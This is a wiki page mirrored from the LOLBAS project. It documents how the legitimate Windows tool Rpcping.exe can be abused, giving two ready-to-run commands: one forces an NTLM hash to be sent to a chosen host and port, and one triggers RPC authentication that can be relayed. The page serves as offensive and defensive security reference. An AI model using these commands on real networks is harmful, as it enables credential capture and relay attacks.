# LOLBAS: Rpcping.exe

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[LOLBAS|Índice LOLBAS]]

> Fuente: [https://lolbas-project.github.io/](https://lolbas-project.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

LOLBAS — binarios legitimos de Windows usables como atacante (living off the land).

**Categorías:** `Credentials`

Used to verify rpc connection

## Comandos

### Capture credentials on a non-standard port

Credentials · priv: User · T1003

```cmd
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
```

Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.

### Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port

Credentials · priv: User · T1187

```cmd
rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM
```

Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).

